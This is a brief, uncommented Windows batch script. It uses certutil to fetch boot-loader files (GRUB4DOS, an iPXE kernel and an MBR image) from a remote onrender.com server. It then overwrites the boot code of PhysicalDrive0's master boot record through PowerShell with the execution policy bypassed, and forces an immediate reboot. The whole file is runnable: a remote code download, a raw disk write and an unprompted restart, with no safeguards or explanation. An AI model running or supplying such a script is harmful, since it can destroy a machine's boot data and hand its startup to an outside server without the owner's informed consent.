@echo off
set SERVER=https://ipxe-boot.onrender.com
certutil -urlcache -split -f %SERVER%/grldr C:\grldr
certutil -urlcache -split -f %SERVER%/menu.lst C:\menu.lst
certutil -urlcache -split -f %SERVER%/ipxe.lkrn C:\ipxe.lkrn
certutil -urlcache -split -f %SERVER%/grldr.mbr C:\grldr.mbr

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$mbr=[IO.File]::ReadAllBytes('C:\grldr.mbr'); $fs=New-Object IO.FileStream('\\.\PhysicalDrive0',[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite); $cur=New-Object byte[] 512; [void]$fs.Read($cur,0,512); for($i=0;$i -lt 440;$i++){ $cur[$i]=$mbr[$i] }; $fs.Seek(0,[IO.SeekOrigin]::Begin) | Out-Null; $fs.Write($cur,0,512); $fs.Close()"

shutdown /r /t 0
